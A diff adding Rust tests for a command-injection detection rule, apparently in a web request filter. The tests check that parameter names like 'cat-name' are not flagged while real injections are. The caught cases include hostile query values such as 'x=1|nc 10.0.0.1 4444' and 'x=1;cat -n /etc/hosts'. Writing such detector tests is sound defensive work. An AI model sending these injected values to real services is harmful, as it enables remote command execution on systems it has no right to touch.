@@ -764,6 +764,29 @@ fn built_in_rules_leave_their_negative_examples_alone() {
     }
 }
 
+/// A parameter whose name starts with a command name is not a command: the command
+/// must be followed by whitespace, the end of the value, or a shell separator.
+#[rstest]
+#[case::id_parameter_with_dash("x=1&id-from=3")]
+#[case::cat_parameter_with_dash("x=1&cat-name=x")]
+#[case::nc_parameter_with_dash("x=1&nc-mode=1")]
+#[case::command_name_inside_a_longer_word("x=1&identity=2")]
+fn a_parameter_named_after_a_command_is_not_a_command_injection(#[case] query: &str) {
+    let hit = builtin_hit("GET", "/run", Some(query), UA, b"");
+    assert_ne!(hit.as_deref(), Some("vh-cmdi-001"), "{query}");
+}
+
+/// The command is still caught when it ends the value, or is followed by a space or a separator.
+#[rstest]
+#[case::at_the_end_of_the_value("x=1&id")]
+#[case::followed_by_a_space("x=1;cat -n /etc/hosts")]
+#[case::after_a_pipe_followed_by_a_host("x=1|nc 10.0.0.1 4444")]
+#[case::followed_by_a_semicolon("x=1&sh;ls")]
+fn a_shell_command_is_still_caught(#[case] query: &str) {
+    let hit = builtin_hit("GET", "/run", Some(query), UA, b"");
+    assert_eq!(hit.as_deref(), Some("vh-cmdi-001"), "{query}");
+}
+
 /// Ordinary text that a fixed-width signature must not match: SQL and HTML discussed in prose,
 /// a code paste, a base64 blob, Japanese text and a relative link.
 #[rstest]
